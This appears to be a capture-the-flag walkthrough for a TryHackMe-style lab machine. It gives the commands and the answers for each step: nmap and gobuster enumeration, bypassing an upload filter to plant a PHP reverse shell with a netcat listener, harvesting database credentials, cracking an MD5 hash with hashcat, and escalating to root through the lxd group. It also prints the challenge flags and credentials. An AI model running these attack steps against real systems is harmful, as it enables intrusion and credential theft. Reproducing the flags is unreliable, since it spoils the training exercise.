# IP=10.10.98.38


### [Day 24] Special by DarkStar - The Trial Before Christmas ###

1. Scan the machine. What ports are open?

	* `nmap -sC -sV -oN nmap/initial $IP`

```
80, 65000
```

2. What's the title of the hidden website? It's worthwhile looking recursively at all websites on the box for this step.

	* Check out http://$IP:65000

```
Light Cycle
```

3. What is the name of the hidden php page?

	* `gobuster dir -u http://$IP:65000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -o gobuster.log`

```
uploads.php
```

4. What is the name of the hidden directory where file uploads are saved?

	* Check out `gobuster.log`

```
grid
```

5. Bypass the filters. Upload and execute a reverse shell.

	* (optional): You can familiarize yourself with the two client-side javascript files used for the upload process by going to `http://$IP:65000/assets/js/upload.js` and `http://$IP:65000/assets/js/filter.js`
	* Open and configure BurpSuite.
	* Enable the interception of javascript files (this article helped: https://matthewsetter.com/introduction-to-burp-suite/).
	* Turn on the interceptor and in your browser, navigate to `http://$IP:65000/uploads.php`.
	* Forward all requests EXCEPT for the `assets/js/filter.js` file. For that, you'll want to drop it.
	* Create and edit a php-reverse-shell script. Once created, change the file extension from `.php` to `.jpg.php`.
	* Go through the process of uploading the php reverse shell file. You should still have the intercept on.
	* Before clicking forward, go to the Headers tab and down in the text box, change `data:application/x-php` to `data:image/jpeg`.
	* Click Forward. Your reverse shell should now be uploaded.
		* Locally run `nc -lnvp 4444`.

6. What is the value of the web.txt flag?

```
THM{ENTER_THE_GRID}
```

7. Upgrade and stabilize your shell.

	* `python3 -c 'import pty; pty.spawn("/bin/bash")'`
	* `fg`
	* `stty raw -echo`
	* `export TERM=xterm`

8. Review the configuration files for the webserver to find some useful loot in the form of credentials. What credentials do you find? username:password

```
tron:IFightForTheUsers
```

9. Access the database and discover the encrypted credentials. What is the name of the database you find these in?

	* Login to the mysql client: `mysql -utron -p` + `IFightForTheUsers`.
	* View all databases: `show databases;`.
	* Use the tron database: `use tron;`.
	* View all tables: `show tables;`.
	* Select all the data from the user table: `SELECT * FROM users;`.
		* This prints out the user:password: `flynn:edc621628f6d19a13a00fd683f5e3ff7`.

```
tron
```

10. What is the value of the user.txt flag?

	* Decrypt the password, `edc621628f6d19a13a00fd683f5e3ff7`.
	* Check the hash type using this tool: https://www.tunnelsup.com/hash-analyzer/.
		* Hash is of type MD5 or MD4.
	* Use hashcat to decrypt:
		* Searched which mode to use: `hashcat -h | grep MD5`
		* Saved the password to a hash file: `echo 'edc621628f6d19a13a00fd683f5e3ff7' > flynn-password-hash.hash`
		* Run hashcat: `hashcat -a 0 -m 0 flynn-password-hash.hash /usr/share/wordlists/rockyou.txt`

```
@computer@
```

11. Check the user's groups. Which group can be leveraged to escalate privileges? 

	* Check the groups for the user, flynn: `id`.

```
lxd
```

12. Abuse this group to escalate privileges to root.

	* Follow along in either this challenge's tutorial or check out this article: https://www.hackingarticles.in/lxd-privilege-escalation/.

13. What is the value of the root.txt flag?

```
THM{FLYNN_LIVES}
```